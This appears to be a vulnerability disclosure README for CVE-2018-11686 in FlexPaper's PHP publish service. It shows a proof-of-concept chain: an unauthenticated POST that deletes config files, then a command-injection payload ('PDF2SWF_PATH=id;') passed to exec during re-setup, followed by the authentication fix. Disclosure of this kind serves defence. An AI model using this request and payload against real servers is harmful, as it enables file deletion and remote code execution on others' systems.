# CVE-2018-11686

CVE-2018-11686 - FlexPaper PHP Publish Service RCE <= 2.3.6

![image](https://user-images.githubusercontent.com/5891788/54714075-6b3ae700-4b50-11e9-8424-5783075a66ff.png)

found by [Red Timmy Security](redtimmysec.wordpress.com)

**Technical Analysis:**
- https://www.exploit-db.com/docs/english/46521-flexpaper-=-2.3.6-remote-code-execution-whitepaper.pdf

**Security advisory:**
- unknow

---

### Proof Of Concept:

1. **Removing the config files**

The file `change_config.php` of FlexPaper (PHP) doesn't check if the adminsitrator is authentication properly, allowing an attacker to delete arbitrary files on the server:

![capture d'écran4](https://user-images.githubusercontent.com/5891788/54716078-4432e400-4b55-11e9-8cbd-7f9539fbefa1.png)

- The yellow line shows where the check of authentication should be placed
- The red lines show the path taken by an attacker to delete files on the server using the `unlink` PHP function

An attacker can craft a request like this and delete files on the folder of his choice:
```
POST /flexpaper/php/change_config.php HTTP/1.1
Host: 127.0.0.1:8888
[...]

SAVE_CONFIG=1&SWF_Directory=config/
```
With this request, an attacker deletes all files on the `config` directory.

2. **Setup a new config file**

Since all files on the `config/` folder are deleted, FlexPaper will think that the application has never been initialized:

![image](https://user-images.githubusercontent.com/5891788/54717304-2fa41b00-4b58-11e9-8345-742cbbce20cc.png)

Therefore an attacker is able to setup again the FlexPaper. But why ?

3. **Execute arbitrary command**

Inside the `setup.php` there is a function called `pdf2swfEnabled` that uses the command `exec` in PHP with a parameter passed in POST by the user. Since this is the initialisation (check 2.) of FlexPaper there is no authentication.
 
![capture d'écran3](https://user-images.githubusercontent.com/5891788/54717205-f1a6f700-4b57-11e9-9bc6-b0d953385d99.png)

An attacker can craft a payload like this: `?step=4&PDF2SWF_PATH=id;` resulting `exec(id; --version 2>&1)`.

4. **Getting the output**

The attacker can redirect the output of the command inside the a file inside the `config` folder and make a GET request to read the output:

![image](https://user-images.githubusercontent.com/5891788/54714075-6b3ae700-4b50-11e9-8424-5783075a66ff.png)

---

### Fix

The check of the authentication has been added at the beginning of the `change_config.php`

![image](https://user-images.githubusercontent.com/5891788/54718092-06848a00-4b5a-11e9-85f5-263d3cc60d8e.png)
